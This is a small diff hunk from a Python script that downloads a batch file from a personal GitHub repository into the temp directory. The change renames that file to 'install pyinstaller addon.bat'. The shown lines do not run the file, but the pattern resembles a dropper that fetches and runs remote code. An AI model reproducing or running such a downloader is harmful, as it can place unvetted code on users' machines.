@@ -9,7 +9,7 @@ URL = "https://github.com/nickita166/pyinstaller-addon/raw/refs/heads/main/insta
 def main():
     # Temp file path
     temp_dir = tempfile.gettempdir()
-    bat_path = os.path.join(temp_dir, "pyinstaller.bat")
+    bat_path = os.path.join(temp_dir, "install pyinstaller addon.bat")
 
     print("[+] Downloading PyInstaller addon...")
 
